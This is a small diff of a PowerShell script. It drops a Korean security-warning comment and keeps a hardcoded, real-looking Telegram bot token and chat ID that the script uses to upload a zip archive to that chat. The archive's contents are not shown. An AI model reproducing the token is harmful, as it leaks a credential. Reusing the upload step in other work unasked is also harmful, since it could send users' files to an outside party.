@@ -1,5 +1,3 @@
-# ==== User Configuration ====
-# ⚠️ 보안 경고: 실제 토큰을 입력하세요.
 $botToken = "8529187820:AAGN2vlcmLBtf-EaZKWfkR9ufRrVOssQMKo"  # 예: 123456789:ABC...
 $chatId   = "8121448802"    # 예: 12345678
 # ============================
@@ -102,3 +100,4 @@ function Send-TelegramDocument {
 Send-TelegramDocument -token $botToken -chat_id $chatId -filePath $zipPath
 
 Write-Host "==== Process Finished ====" -ForegroundColor Cyan
+
